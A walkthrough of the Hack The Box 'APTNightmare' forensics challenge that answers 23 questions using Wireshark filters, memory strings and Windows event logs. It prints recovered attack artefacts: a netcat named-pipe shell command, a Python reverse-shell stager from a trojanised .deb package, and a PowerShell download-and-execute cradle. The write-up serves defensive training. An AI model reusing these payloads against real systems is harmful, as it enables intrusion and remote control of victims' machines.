# APTNightmare

Hack the Box Link: [APTNightmare](https://app.hackthebox.com/sherlocks/APTNightmare)

1. What is the IP address of the infected web server?
* *Answer*: 192.168.1.3
* Look through the pcap provided and identify the various GET requests that are evident of scanning against the target. 
2. What is the IP address of the Attacker?
* *Answer*: 192.168.1.5
* Look through the pcap provided and identify the various GET requests that are evident of scanning from the attacker. 
3. How many open ports were discovered by the attacker?
* *Answer*: 14
* Look through the wireshark pcap and search for ```((((ip.src == 192.168.1.3) && (ip.dst == 192.168.1.5)) && (tcp.flags == 0x0012))``` to cover just SYN ACK responses. 
4. What are the first five ports identified by the attacker in numerical order during the enumeration phase, not considering the sequence of their discovery?
* *Answer*: 25,53,80,110,119
* Look for ```ip.dst == 192.168.1.3 and ip.src_host == 192.168.1.5 and tcp.flags.reset == 1```. 
5. The attacker exploited a misconfiguration allowing them to enumerate all subdomains. This misconfiguration is commonly referred to as (e.g, Unrestricted Access Controls)?
* *Answer*: dns zone transfer
* Can view DNS zone transfers in wireshark with ```dns.qry.type == 252```. 
6. How many subdomains were discovered by the attacker?
* *Answer*: 9
* Looking through ```dns.qry.type == 252``` you can see the subdomain enumerations within the answers. 
7. What is the compromised subdomain (e.g., dev.example.com) ?
* *Answer*: sysmon.cs-corp.cd
* Looked for ```_ws.col.info == "HTTP/1.1 200 OK  (text/html)"``` within wireshark. 
8. What email address and password were used to log in (e.g., user@example.com:password123)?
* *Answer*: admin@cs-corp.cd:Pass@000_
* Looking through the wireshark pcap, filter out all of the same username and password attempts via POST requests with ```(http.request.method == "POST") && !(urlencoded-form.value == "addd")```
9. What command gave the attacker their initial access ?
* *Answer*: ```|mkfifo /tmp/mypipe;cat /tmp/mypipe|/bin/bash|nc -l -p 5555 >/tmp/mypipe```
* Look through the interactions between the source and destination and find the most recent interaction before the reverse shell on port 5555. Use ```((ip.src == 192.168.1.3) && (ip.dst == 192.168.1.5) ) || ((ip.dst == 192.168.1.3) && (ip.src == 192.168.1.5))```. 
10. What is the CVE identifier for the vulnerability that the attacker exploited to achieve privilege escalation (e.g, CVE-2016-5195) ?
* *Answer*: CVE-2021-4034
* Look through the reverse shell traffic on port 5555 (tcp.stream eq 2785) and find the PwnKit download and execution on the host to get root access. 
11. What is the MITRE ID of the technique used by the attacker to achieve persistence (e.g, T1098.001)?
* *Answer*: T1053.003
* Look through the reverse shell traffic on port 5555 (tcp.stream eq 2785) and find the edit of crontab using curl commands from the remote host to the local host. 
12. The attacker tampered with the software hosted on the 'download' subdomain with the intent of gaining access to end-users. What is the Mitre ATT&CK technique ID for this attack?
* *Answer*: T1195.002
* Since the downloads are mean to be in the software downloads for the company, it is a way to involved with the Supply Chain. 
13. What command provided persistence in the cs-linux.deb file?
* *Answer*: echo cs-linux && >> ~/.bashrc
* Grab the file from HTTP in Wireshark and download the file, unzip the package and you find base64 encoded and zlib compressed files with the below: 
	```
	import socket,zlib,base64,struct,time,os
	
	os.system("echo cs-linux && >> ~/.bashrc")
	for x in range(10):
		try:
			s=socket.socket(2,socket.SOCK_STREAM)
			s.connect(('192.168.1.5',4444))
			break
		except:
			time.sleep(5)
	l=struct.unpack('>I',s.recv(4))[0]
	d=s.recv(l)
	while len(d)<l:
		d+=s.recv(l-len(d))
	exec(zlib.decompress(base64.b64decode(d)),{'s':s})
	```
14. The attacker sent emails to employees, what the name for the running process that allowed this to occur?
* *Answer*: citserver
* Search through the strings output of the memory image to find the reference in other email strings. 
15. We received phishing email can you provide subject of email ?
* *Answer*: Review Revised Privacy Policy
* Ran strings on the memory dump and searched for "email"
16. What is the name of the malicious attachment?
* *Answer*: policy.docm
* Ran strings on the memory dump and searched for "email"
17. Please identify the usernames of the CEOs who received the attachment.
* *Answer*: ceo-ru, ceo-us
* Run strings on the memory image and search for ```recp=``` related to email traffic. 
18. What is the hostname for the compromised CEO?
* *Answer*: DESKTOP-ELS5JAK
* Looked through the powershell event logs with [python-evtx](https://github.com/ajread4/python-evtx).
19. What is the full path for the malicious attachment?
* *Answer*: C:\USERS\CEO-US\DOWNLOADS\POLICY.DOCM
* Search through the KAPE triage image for "policy.docm" using recursive grep. 
20. Can you provide the command used to gain initial access?
* *Answer*: powershell.exe -nop -w hidden -c IEX ((new-object net.webclient).downloadstring('http[:]//192[.]168[.]1[.]5[:]806/a'))
* Look through the powershell logs from the KAPE image with ```python3 ~/resources/python-evtx/scripts/evtx_dump_json.py "Windows PowerShell.evtx" | jq```
21. Provide a Popular threat label for the malicious executable used to gain initial access?
* *Answer*: trojan.cobaltstrike/beacon
* Able to grab the base64 encoded code within the powershell script. From the base64 code, needed to decode and bitwise XOR to reveal a PE32+ executable. Took the hash and passed through virus total to find the threat label. 
22. What is the payload type?
* *Answer*: windows-beacon_http-reverse_http
* Utilize [1768](https://github.com/DidierStevens/DidierStevensSuite/blob/master/1768.py) and pull the payload type from the output with ```python3 1768.py ~/Downloads/binary_file.txt```. 
23. What is task name has been add by attacker?
* *Answer*: WindowsUpdateCheck
* Look through the tasks from the KAPE image and find the task with weird cmd.exe start and time that makes sense based on the adversary access. 